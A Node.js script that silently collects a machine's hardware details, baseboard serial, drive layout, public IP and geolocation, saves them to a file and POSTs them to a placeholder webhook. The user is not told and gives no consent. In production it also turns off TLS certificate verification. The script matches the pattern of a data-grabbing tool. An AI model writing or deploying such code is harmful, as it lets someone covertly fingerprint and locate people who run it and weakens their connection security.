if (process.env.NODE_ENV === 'production') {
  process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
}

const si = require('systeminformation');
const fs = require('fs');
const axios = require('axios');

async function collectSystemInfo() {
  try {
    const [cpu, mem, osData, baseboard, drives] = await Promise.all([
      si.cpu(),
      si.mem(),
      si.osInfo(),
      si.baseboard(),
      si.diskLayout(),
    ]);

    const publicIp = await lookupPublicIp();
    const geoip = await lookupGeoip(publicIp);

    const systemInfo = {
      cpuManufacturer: cpu.manufacturer,
      cpuBrand: cpu.brand,
      cpuSpeed: `${cpu.speed} GHz`,
      cpuCores: cpu.cores,
      totalMemory: `${(mem.total / 1024 / 1024 / 1024).toFixed(2)} GB`,
      platform: osData.platform,
      osType: osData.distro,
      osRelease: osData.release,
      baseboardManufacturer: baseboard.manufacturer,
      baseboardModel: baseboard.model,
      baseboardVersion: baseboard.version,
      baseboardSerial: baseboard.serial,
      drives,
      geoip,
    };

    return systemInfo;
  } catch (error) {
    console.error('Error collecting system info:', error);
    return {};
  }
}

async function lookupPublicIp() {
  try {
    const response = await axios.get('https://api.ipify.org?format=json');
    const data = response.data;
    return data.ip;
  } catch (error) {
    console.error('Error looking up public IP:', error);
    return '';
  }
}

async function lookupGeoip(ip) {
  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    const data = response.data;
    return {
      city: data.city || null,
      region: data.regionName || null,
      country: data.country || null,
      latitude: data.lat || 0,
      longitude: data.lon || 0,
    };
  } catch (error) {
    console.error('Error looking up GeoIP:', error);
    return {
      city: null,
      region: null,
      country: null,
      latitude: 0,
      longitude: 0,
    };
  }
}

const saveInfoToFile = async (systemInfo, outputFileName) => {
  const json = JSON.stringify(systemInfo, null, 2);
  const data = `<?xml version="1.0" encoding="UTF-8"?>
<SystemInformation>
${json}
</SystemInformation>`;

  fs.writeFile(
    outputFileName.replace(/\.json$/, '.xml'),
    data,
    async (err) => {
      if (err) throw err;
      console.log(`System info saved to ${outputFileName}`);
      
      // Send the systemInfo object to the specified webhook
      try {
        const response = await axios.post('yourwebhooklink', systemInfo);
        console.log('System info sent to webhook:', response.data);
      } catch (error) {
        console.error('Error sending system info to webhook:', error);
      }
    }
  );
};

(async () => {
  console.log('Collecting system information...');
  const systemInfo = await collectSystemInfo();
  console.log('System information collected.');
  const outputFileName = 'system_info.json';
  saveInfoToFile(systemInfo, outputFileName);
  })();
